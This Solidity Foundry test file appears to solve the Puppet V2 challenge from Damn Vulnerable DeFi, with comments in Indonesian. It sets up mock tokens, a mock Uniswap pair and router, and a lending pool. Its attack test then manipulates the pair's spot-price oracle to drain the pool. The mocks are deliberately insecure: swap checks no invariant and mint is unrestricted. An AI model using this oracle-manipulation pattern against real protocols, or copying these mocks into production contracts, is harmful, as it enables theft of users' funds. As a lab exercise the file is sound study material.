// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// --- 1. MOCK TOKENS (DVT & WETH) ---

contract DamnValuableToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
    function transfer(address to, uint256 amount) public returns (bool) {
        return transferFrom(msg.sender, to, amount);
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(balanceOf[from] >= amount, "Balance low");
        if (from != msg.sender && allowance[from][msg.sender] != type(uint256).max) {
            require(allowance[from][msg.sender] >= amount, "Allowance low");
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract WETH9 is DamnValuableToken {
    // WETH bisa terima ETH dan ubah jadi Token
    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        totalSupply += msg.value;
    }
    function withdraw(uint256 wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        totalSupply -= wad;
        payable(msg.sender).transfer(wad);
    }
}

// --- 2. MOCK UNISWAP V2 (REVISI: FIXED LOGIC) ---

contract UniswapV2Pair {
    address public token0;
    address public token1;
    uint112 private reserve0;
    uint112 private reserve1;

    constructor(address _token0, address _token1) {
        token0 = _token0;
        token1 = _token1;
    }

    function sync() external {
        reserve0 = uint112(DamnValuableToken(token0).balanceOf(address(this)));
        reserve1 = uint112(DamnValuableToken(token1).balanceOf(address(this)));
    }

    function getReserves() public view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, 0);
    }

    // Fungsi Swap (x * y = k)
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata) external {
        require(amount0Out > 0 || amount1Out > 0, "INSUFFICIENT_OUTPUT_AMOUNT");
        
        // 1. Transfer DULU ke user
        if (amount0Out > 0) DamnValuableToken(token0).transfer(to, amount0Out);
        if (amount1Out > 0) DamnValuableToken(token1).transfer(to, amount1Out);
        
        // 2. BARU Update Reserve sesuai saldo SISA di kontrak
        // (Versi sebelumnya salah urutan di sini)
        reserve0 = uint112(DamnValuableToken(token0).balanceOf(address(this)));
        reserve1 = uint112(DamnValuableToken(token1).balanceOf(address(this)));
    }
}

contract UniswapV2Router {
    UniswapV2Pair public pair;
    address public weth;

    constructor(address _pair, address _weth) {
        pair = UniswapV2Pair(_pair);
        weth = _weth;
    }

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts) {
        // Transfer token user ke Pair
        DamnValuableToken(path[0]).transferFrom(msg.sender, address(pair), amountIn);
        
        // Hitung output (Mock Simplified Math)
        (uint112 res0, uint112 res1,) = pair.getReserves();
        // Input amountIn sudah masuk ke balance, tapi belum ke reserve di logic mock ini
        // Kita hitung berdasarkan reserve lama yang belum update
        
        uint amountInWithFee = amountIn * 997;
        uint numerator = amountInWithFee * uint256(res1);
        uint denominator = (uint256(res0) * 1000) + amountInWithFee;
        uint amountOut = numerator / denominator;
        
        require(amountOut >= amountOutMin, "Slippage");
        
        // Eksekusi Swap di Pair
        pair.swap(0, amountOut, to, "");
        return new uint[](2);
    }
}

// --- 3. TARGET: PUPPET V2 POOL ---

contract PuppetV2Pool {
    address private _weth;
    address private _token;
    address private _uniswapPair;
    mapping(address => uint256) public deposits;

    constructor(address wethAddress, address tokenAddress, address uniswapPairAddress) {
        _weth = wethAddress;
        _token = tokenAddress;
        _uniswapPair = uniswapPairAddress;
    }

    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = UniswapV2Pair(_uniswapPair).getReserves();
        
        // Rumus Oracle: Harga = Reserve ETH / Reserve Token
        // Deposit = Amount * (ResETH / ResToken) * 3
        return (tokenAmount * uint256(reserve1) * 3) / uint256(reserve0);
    }

    function borrow(uint256 borrowAmount) external {
        uint256 depositRequired = calculateDepositOfWETHRequired(borrowAmount);
        
        // Tarik WETH user
        WETH9(_weth).transferFrom(msg.sender, address(this), depositRequired);
        deposits[msg.sender] += depositRequired;

        // Kirim DVT ke user
        require(DamnValuableToken(_token).transfer(msg.sender, borrowAmount));
    }
}

// --- 4. ATTACK SCRIPT ---

contract PuppetV2Challenge is Test {
    DamnValuableToken token;
    WETH9 weth;
    UniswapV2Pair pair;
    UniswapV2Router router;
    PuppetV2Pool pool;

    address attacker = address(0xBAD);

    function setUp() public {
        token = new DamnValuableToken();
        weth = new WETH9();
        
        // Pair: Token0=DVT, Token1=WETH
        pair = new UniswapV2Pair(address(token), address(weth));
        router = new UniswapV2Router(address(pair), address(weth));
        pool = new PuppetV2Pool(address(weth), address(token), address(pair));

        // Setup Saldo
        token.mint(address(pair), 100 ether);
        weth.mint(address(pair), 10 ether);
        pair.sync(); 

        token.mint(address(pool), 1_000_000 ether);
        token.mint(attacker, 10_000 ether);
        vm.deal(attacker, 20 ether);
    }

    function test_PuppetV2_Attack() public {
        vm.startPrank(attacker);

        console.log("Jaminan Awal (WETH):", pool.calculateDepositOfWETHRequired(1_000_000 ether));

        // --- STEP 1: DUMP TOKEN DI UNISWAP ---
        token.approve(address(router), type(uint256).max);
        
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        router.swapExactTokensForTokens(
            10_000 ether,
            1,
            path,
            attacker,
            block.timestamp
        );

        // --- STEP 2: WRAP ETH JADI WETH ---
        // Convert semua ETH di dompet (termasuk hasil swap) jadi WETH
        weth.deposit{value: address(attacker).balance}();

        // --- STEP 3: CEK HARGA BARU & PINJAM ---
        uint256 poolBalance = token.balanceOf(address(pool));
        uint256 collateral = pool.calculateDepositOfWETHRequired(poolBalance);
        
        console.log("Jaminan Setelah DUMP (WETH):", collateral);
        console.log("Saldo WETH Attacker:", weth.balanceOf(attacker));

        weth.approve(address(pool), collateral);
        pool.borrow(poolBalance);

        vm.stopPrank();

        // VERIFIKASI
        assertEq(token.balanceOf(address(pool)), 0);
        assertGe(token.balanceOf(attacker), 1_000_000 ether);
    }
}